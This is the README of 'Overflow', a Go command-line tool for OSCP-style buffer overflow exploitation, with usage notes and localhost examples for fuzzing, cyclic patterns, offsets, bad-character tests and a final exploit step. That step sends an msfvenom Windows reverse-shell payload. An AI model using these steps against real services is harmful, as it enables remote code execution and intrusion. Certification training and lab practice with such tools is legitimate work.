# Overflow

[![Build Status](https://img.shields.io/github/workflow/status/sradley/overflow/Test?style=flat-square)](https://github.com/sradley/overflow/actions)
[![Latest Release](https://img.shields.io/github/v/release/sradley/overflow?style=flat-square)](https://github.com/sradley/overflow/releases)
[![Issues](https://img.shields.io/github/issues/sradley/overflow?style=flat-square)](https://github.com/sradley/overflow/issues)
[![Go Version](https://img.shields.io/github/go-mod/go-version/sradley/overflow?style=flat-square)](https://golang.org/)

Overflow is a command-line tool used exploiting OSCP-style buffer overflow
vulnerabilities with a focus on rapid exploitation. However, I would
**strongly** suggest that you understand everything that this tool can do,
particularly if you're planning on getting your OSCP certification. Have fun!

![fuzz.gif](doc/fuzz.gif)

## Table of Contents
 * [Installation](#installation)
   - [Pre-Built Binaries](#pre-built-binaries)
   - [Using Go Get](#using-go-get)
   - [Building from Source](#building-from-source)
 * [Usage](#usage)
   - [Fuzzing for Buffer Length](#usage-fuzz)
   - [Sending Cyclic Patterns](#usage-pattern)
   - [Finding the Offset](#usage-offset)
   - [Sending Bad Characters](#usage-chars)
   - [Running Exploits](#usage-exploit)
 * [Templating](#templating)
   - [Special Characters](#special-characters)
 * [Examples](#examples)
   - [Fuzzing for Buffer Length](#example-fuzz)
   - [Sending Cyclic Patterns](#example-pattern)
   - [Finding the Offset](#example-offset)
   - [Sending Bad Characters](#example-chars)
   - [Running Exploits](#example-exploit)

## Installation

### Pre-Built Binaries
If you don't have a golang environment, or you just don't feel like building
from source, you can check out the
[releases](https://github.com/sradley/overflow/releases) page for pre-built
binaries.

### Using Go Get
If you have a golang environment set up, you can use `go get` to fetch and
install the binary in your `$GOPATH/bin` directory.
```sh
$ go get github.com/sradley/overflow
```

### Building from Source
If you have a golang environment set up, you can build straight from source.

The following commands will install dependencies and compile a working binary. 
```sh
$ git clone https://github.com/sradley/overflow.git
$ cd overflow
$ go get && go build
```

You can also use `go install` to install the binary in your `$GOPATH/bin`
directory.
```sh
$ git clone https://github.com/sradley/overflow.git
$ cd overflow
$ go install
```

## Usage
The help text is pretty exhaustive, so it's a good place to start if you want
to get a feel for this tool.
```
$ overflow help
$ overflow (fuzz | pattern | offset | chars | exploit) --help
```

The required flags for (almost) every subcommand are "addr" and "port". You can
also specify a [template](#templating) which controls how your payload is sent
to the target service (in the the case that a menu or something is presented to
you upon connection).

### Fuzzing for Buffer Length <a name="usage-fuzz"></a>
Possibly the most important step in buffer overflow exploitation is finding the
length of buffer you want to target. An easy way to do this is to send
increasingly large sequences of bytes to the buffer until it crashes.

The `fuzz` subcommand sends increasingly large sequences of bytes (the increase
is specifed by the "step" flag) until the service crashes. This tool also
outputs the possible size of the buffer, in case it wasn't easy enough already. 

The required flags are "addr", "port" and "step".
```
$ overflow fuzz (-a|--addr ADDR) (-p|--port PORT) (-s|--step STEP) [flags]
```

Take a look at [Examples: Fuzzing for Buffer Length](#example-fuzz) for a more
comprehensive example.

### Sending Cyclic Patterns <a name="usage-pattern"></a>
Why would you want to do this? Well, sending a cyclic pattern of bytes to the
target service is a very easy way to figure out the offset of the EIP register.
Tools like `mona` can automatically determine the offset of particular
registers if buffer has been overflowed with a cyclic pattern of bytes.

The `pattern` subcommand streamlines the process of generating a cyclic pattern
of bytes and sending it to the target service. Turning what is normally an
annoying multi-step process into a single command.

The required flags are "addr", "port" and "length".
```
$ overflow pattern (-a|--addr ADDR) (-p|--port PORT) (-l|--length LENGTH) [flags]
```

Take a look at [Examples: Sending Cyclic Patterns](#example-pattern) for a more
comprehensive example.

### Finding the Offset <a name="usage-offset"></a>
The next step after sending the cyclic pattern to the target service is using
that pattern to find the various offsets to particular registers (one important
register would be EIP). All we would have to do is pass value of the bytes that
overwrote the register to the `offset` subcommand, and we would get the offset
of that register.

The only required flag is "query".
```
$ overflow offset (-q|--query QUERY) [flags]
```

Take a look at [Examples: Finding the Offset](#example-offset) for a more
comprehensive example.

### Sending Bad Characters <a name="usage-chars"></a>
An important part of buffer overflow exploitation is determining which
characters are "bad", or which characters are treated differently by the target
service.

The `chars` subcommand sends every character from 0x00 to 0xFF to the target
service. You can optionally exclude particular characters from the payload sent
to the target service.

Required flags are "addr", "port" and "offset".
```
$ overflow chars (-a|--addr ADDR) (-p|--port PORT) (-o|--offset OFFSET) [flags]
```

Take a look at [Examples: Sending Bad Characters](#example-chars) for a more
comprehensive example.

### Running Exploits <a name="usage-exploit"></a>
Once you've found the offset of the EIP register, and a valid jump address, you
can execute shellcode on the target service. The `exploit` subcommand provides
an easy way to do so.

Required flags are "addr", "port", "offset", "jump" and "shell". Where shell is
the path to your desired payload.
```
$ overflow exploit (-a|--addr ADDR) (-p|--port PORT) (-o|--offset OFFSET) \
    (-j|--jump JUMP) (-s|--shell SHELL) [flags]
```

Take a look at [Examples: Running Exploits](#example-exploit) for a more
comprehensive example.

## Templating
Templates allow you to insert data before and/or after your payload. They also
allow you to navigate through, for example, a menu that you are presented with.

Say you needed to prefix your payload with the string "OVERFLOW1", in order to
execute your buffer overflow. You could provide a template like this:
```
$ overflow ... --template "OVERFLOW1 {payload}"
```

### Special Characters
The only special character of note (and currently supported) is the `<CR>`
special character. Not only does it insert `\r\n`, but the tool treats it as
the end of a message.

Say when you connect to the target service you presented with the following.
```
Username: <user-input>
Message:  <user-input>
```

But the buffer overflow is in the "message" part of the service. A template to
exploit this would be: `stephen<CR>{payload}<CR>`. Resulting in an information
flow kind of like this:
```
Username: stephen
Message:  <payload>
```

In the above template, the `stephen<CR>` and `{payload}<CR>` parts are treated
as separate messages, allowing you to navigate the menu and insert your buffer
overflow where you need it.

## Examples

### Fuzzing for Buffer Length <a name="example-fuzz"></a>
Here's a quick example using this subcommand to fuzz for the length of the
target buffer in 100-byte steps.
```
$ overflow fuzz -a 127.0.0.1 -p 4444 -s 100
```
```
            /------------------\  lower
            |                  |  memory
            |       Text       |  addresses
            |                  |
            |------------------|
            |   (Initialized)  |
            |        Data      |
            |  (Uninitialized) |
            |------------------|
            |                  |
            |       Stack      |  higher
            |                  |  memory
            \------------------/  addresses

        Fig. 1 Process Memory Regions
 
 github.com/sradley                     v2.0.0
───────────────────────────────────────────────
  . mode                : fuzz
  . (-a|--addr)         : 127.0.0.1
  . (-p|--port)         : 4444
  . (-s|--step)         : 100
  . (-w|--wait)         : 1000ms
───────────────────────────────────────────────
 > building payload
 > sending 100-byte payload
 > building payload
 > sending 200-byte payload
 > building payload
 > sending 300-byte payload
 > building payload
 > sending 400-byte payload
 > building payload
 > sending 500-byte payload
 
 success: len of buffer is in range (400, 500]
```

### Sending Cyclic patterns <a name="example-pattern"></a>
Here's a quick example using this subcommand to send a 60-byte cyclic pattern
to the target service.
```
$ overflow pattern -a 127.0.0.1 -p 4444 -l 65
```
```
            /------------------\  lower
            |                  |  memory
            |       Text       |  addresses
            |                  |
            |------------------|
            |   (Initialized)  |
            |        Data      |
            |  (Uninitialized) |
            |------------------|
            |                  |
            |       Stack      |  higher
            |                  |  memory
            \------------------/  addresses

        Fig. 1 Process Memory Regions
 
 github.com/sradley                     v2.0.0
───────────────────────────────────────────────
  . mode                : pattern
  . (-a|--addr)         : 127.0.0.1
  . (-p|--port)         : 4444
  . (-l|--length)       : 65
───────────────────────────────────────────────
 > generating pattern
 > building payload
 > sending 65-byte payload
 
 success: no errors found
```

You can see the pattern sent in the `netcat` output below.
```
$ nc -lvp 4444
Connection from 127.0.0.1:48870
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac
```

### Getting the Offset from a Cyclic Pattern <a name="example-offset"></a>
Here's a quick example as to how you'd use the `offset` subcommand to find the
location of a particular sub-pattern.

Note that I'm using the `reverse` flag to let it know that the target system is
little-endian so the bytes in the sub-pattern must be reversed.
```
$ overflow offset -rq "\x38\x6f\x43\x37"
```
```
            /------------------\  lower
            |                  |  memory
            |       Text       |  addresses
            |                  |
            |------------------|
            |   (Initialized)  |
            |        Data      |
            |  (Uninitialized) |
            |------------------|
            |                  |
            |       Stack      |  higher
            |                  |  memory
            \------------------/  addresses

        Fig. 1 Process Memory Regions
 
 github.com/sradley                     v2.0.0
───────────────────────────────────────────────
  . mode                : offset
  . (-q|--query)        : "\x38\x6f\x43\x37"
  . (-r|--reverse)      : true
  . (-l|--length)       : 0
───────────────────────────────────────────────
 > parsing query
 > searching for query within pattern

 success: pattern offset is: 2003
 ```

### Sending Bad Characters <a name="example-chars"></a>
Here's an example showing the use of this subcommand. Make sure you include the
offset to the EIP register.
```
$ overflow chars -a 127.0.0.1 -p 4444 -o 160
```
```
            /------------------\  lower
            |                  |  memory
            |       Text       |  addresses
            |                  |
            |------------------|
            |   (Initialized)  |
            |        Data      |
            |  (Uninitialized) |
            |------------------|
            |                  |
            |       Stack      |  higher
            |                  |  memory
            \------------------/  addresses

        Fig. 1 Process Memory Regions
 
 github.com/sradley                     v2.0.0
───────────────────────────────────────────────
  . mode                : chars
  . (-a|--addr)         : 127.0.0.1
  . (-p|--port)         : 4444
  . (-o|--offset)       : 160
  . (-e|--exclude)      : ""
───────────────────────────────────────────────
 > parsing exclusions
 > generating characters
 > building payload
 > sending 420-byte payload 
 
 success: no errors found
```

You can also optionally specify characters to exclude from the payload, make
sure that you use the format in the example below.
```
$ overflow chars -a 127.0.0.1 -p 4444 -o 160 -e "\x00\x41\xAB\x01"
```
```
            /------------------\  lower
            |                  |  memory
            |       Text       |  addresses
            |                  |
            |------------------|
            |   (Initialized)  |
            |        Data      |
            |  (Uninitialized) |
            |------------------|
            |                  |
            |       Stack      |  higher
            |                  |  memory
            \------------------/  addresses

        Fig. 1 Process Memory Regions
 
 github.com/sradley                     v2.0.0
───────────────────────────────────────────────
  . mode                : chars
  . (-a|--addr)         : 127.0.0.1
  . (-p|--port)         : 4444
  . (-o|--offset)       : 160
  . (-e|--exclude)      : "\x00\x41\xAB\x01"
───────────────────────────────────────────────
 > parsing exclusions
 > generating characters
 > building payload
 > sending 416-byte payload 
 
 success: no errors found
```

### Running Exploits <a name="example-exploit"></a>
Here's a brief example explaining how you can use the `exploit` subcommand to
execute a payload generated by `msfvenom`.

Generate a **raw** payload using `msfvenom`, call it whatever you want.
```
$ msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4321 \
    EXITFUNC=thread -b "\x00" -f raw -o shell
```

Then just use the tool as follows, ensuring you include the offset to the EIP
register and the jump address in the format used in the example below.
```
$ overflow exploit -a 127.0.0.1 -p 4444 -o 160 -rj "\x5f\x4a\x35\x8f" -s path/to/shell
```
```
            /------------------\  lower
            |                  |  memory
            |       Text       |  addresses
            |                  |
            |------------------|
            |   (Initialized)  |
            |        Data      |
            |  (Uninitialized) |
            |------------------|
            |                  |
            |       Stack      |  higher
            |                  |  memory
            \------------------/  addresses

        Fig. 1 Process Memory Regions
 
 github.com/sradley                     v2.0.0
───────────────────────────────────────────────
  . mode                : exploit
  . (-a|--addr)         : 127.0.0.1
  . (-p|--port)         : 4444
  . (-o|--offset)       : 160
  . (-j|--jump)         : "\x5f\x4a\x35\x8f"
  . (-r|--reverse)      : true
  . (-n|--nos)          : 16
  . (-s|--shell)        : path/to/shell
───────────────────────────────────────────────
 > parsing jump address
 > reading shellcode
 > building payload
 > sending 535-byte payload
 
 success: no errors found.
```

Don't forget that if the target system is little-endian you need to write the
jump address backwards (e.g. if the address is "\x01\x02\x03\x04", write it as
"\x04\x03\x02\x01"). Alternatively, you can just specify the "reverse" flag.
```
$ overflow exploit ... -rj "\x01\x02\x03\x04" ...
```

